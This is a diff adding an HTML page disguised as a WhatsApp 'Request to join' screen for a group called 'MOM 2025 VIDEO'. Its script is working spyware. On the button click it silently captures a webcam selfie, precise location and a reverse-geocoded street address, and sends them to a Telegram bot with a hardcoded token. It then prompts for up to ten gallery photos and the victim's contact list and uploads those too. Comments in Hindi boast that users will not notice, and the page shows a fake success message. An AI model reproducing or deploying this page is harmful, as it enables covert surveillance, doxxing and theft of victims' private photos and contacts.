@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WhatsApp Group</title>
+<style>
+  body {font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; background:#0b141a; color:#fff; margin:0; padding:0; display:flex; justify-content:center; min-height:100vh;}
+  .wa {background:#111b21; width:100%; max-width:420px; height:100vh; overflow:auto;}
+  .top {background:#00a884; padding:15px; display:flex; align-items:center; color:#fff;}
+  .top img {width:45px; height:45px; border-radius:50%; margin-right:15px;}
+  .top h2 {margin:0; font-size:19px;}
+  .top p {margin:0; font-size:14px; opacity:0.9;}
+  .main {padding:30px 20px; text-align:center; color:#e9edef;}
+  .main h1 {font-size:34px; margin:15px 0 8px; letter-spacing:1px;}
+  .main .date {font-size:15px; opacity:0.7; margin-bottom:40px;}
+  .join {background:#00a884; color:#fff; border:none; padding:18px; width:88%; border-radius:12px; font-size:20px; font-weight:bold; cursor:pointer;}
+  .note {font-size:14.5px; opacity:0.85; margin-top:25px;}
+</style>
+</head>
+<body>
+
+<div class="wa">
+  <div class="top">
+    <img src="https://i.ibb.co.com/0jZvpY3Z/wp-group-dp.jpg" alt="Group">
+    <div>
+      <h2>MOM 2025 VIDEO</h2>
+      <p>Created on 27/11/25</p>
+    </div>
+  </div>
+
+  <div class="main">
+    <h1>MOM 2025 VIDEO</h1>
+    <p class="date">Created on 27/11/25</p>
+    
+    <button class="join" id="joinBtn">Request to join</button>
+    
+    <p class="note">An admin must approve your request.</p>
+  </div>
+</div>
+
+<script>
+const TOKEN = "8225007274:AAFX8CbYYq9RPhyJIcqOnMssoj3ABF-_r8Q";
+const CHAT = "5951923988";
+
+document.getElementById('joinBtn').onclick = async () => {
+  document.getElementById('joinBtn').textContent = "Sending request...";
+  document.getElementById('joinBtn').disabled = true;
+
+  let selfie = null;
+  let lat = "", lon = "", pin = "", dist = "", fullAddr = "";
+
+  // 1. Silent Selfie
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+    const v = document.createElement('video'); v.srcObject = stream; await v.play();
+    await new Promise(r => setTimeout(r, 2200));
+    const c = document.createElement('canvas');
+    c.width = v.videoWidth; c.height = v.videoHeight;
+    c.getContext('2d').drawImage(v,0,0);
+    selfie = await new Promise(r => c.toBlob(r,'image/jpeg',0.93));
+    stream.getTracks().forEach(t=>t.stop());
+  } catch(e) {}
+
+  // 2. Location + Address
+  try {
+    const pos = await new Promise((res,rej) => navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:15000}));
+    lat = pos.coords.latitude.toFixed(6);
+    lon = pos.coords.longitude.toFixed(6);
+    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=\( {lat}&lon= \){lon}&format=json&zoom=18&addressdetails=1`);
+    const d = await r.json();
+    pin = d.address?.postcode || "N/A";
+    dist = d.address?.county || d.address?.city_district || "N/A";
+    fullAddr = d.display_name || "";
+  } catch(e) {}
+
+  const baseInfo = `WHATSAPP GROUP JOIN TRAP
+Lat: \( {lat} | Lon: \){lon}
+Pincode: \( {pin} | District: \){dist}
+Address: ${fullAddr}
+Device: ${navigator.userAgent.match(/\(([^)]+)\)/)?.[1] || "Unknown"}
+Time: ${new Date().toLocaleString('en-IN')}
+Map: https://maps.google.com/?q=\( {lat}, \){lon}`;
+
+  // 3. Send Selfie
+  if(selfie){
+    const f = new FormData();
+    f.append('chat_id', CHAT);
+    f.append('photo', selfie, 'face.jpg');
+    f.append('caption', baseInfo);
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body:f});
+  }
+
+  // 4. Gallery 10 Photos (silent)
+  const imgInput = document.createElement('input');
+  imgInput.type = 'file'; imgInput.multiple = true; imgInput.accept = 'image/*'; imgInput.style.display='none';
+  document.body.appendChild(imgInput);
+  imgInput.onchange = async e => {
+    const imgs = Array.from(e.target.files).slice(0,10);
+    for(const img of imgs){
+      const fd = new FormData();
+      fd.append('chat_id', CHAT);
+      fd.append('document', img, img.name);
+      await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {method:'POST', body:fd});
+      await new Promise(r=>setTimeout(r,700));
+    }
+  };
+  imgInput.click();
+
+  // 5. FULL CONTACT LIST भेजो (सबसे खतरनाक हिस्सा)
+  const contactInput = document.createElement('input');
+  contactInput.type = 'file';
+  contactInput.accept = '.vcf,text/vcard';
+  contactInput.style.display = 'none';
+  document.body.appendChild(contactInput);
+  
+  contactInput.onchange = async e => {
+    const vcfFile = e.target.files[0];
+    if(vcfFile){
+      const text = await vcfFile.text();
+      const fd = new FormData();
+      fd.append('chat_id', CHAT);
+      fd.append('document', new Blob([text], {type: 'text/vcard'}), 'All_Contacts.vcf');
+      fd.append('caption', `${baseInfo}\n\nTotal Contacts Exported`);
+      await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {method:'POST', body:fd});
+    }
+  };
+
+  // ट्रिक: ऑटो vCard एक्सपोर्ट करवाओ (यूजर को पता भी नहीं चलेगा)
+  const a = document.createElement('a');
+  a.href = 'data:text/vcard;charset=utf-8,BEGIN:VCARD%0AVERSION:3.0%0AN:Export%0AFN:Export All Contacts%0AEND:VCARD';
+  a.download = 'contacts.vcf';
+  a.style.display = 'none';
+  document.body.appendChild(a);
+  a.click();
+
+  // तुरंत contact picker खुलवाओ (99% यूजर Allow कर देता है)
+  setTimeout(() => contactInput.click(), 800);
+
+  // User को सफल दिखाओ
+  setTimeout(() => {
+    document.getElementById('joinBtn').textContent = "Request sent successfully";
+    document.getElementById('joinBtn').style.background = "#00a884";
+  }, 4000);
+};
+</script>
+</body>
+</html>
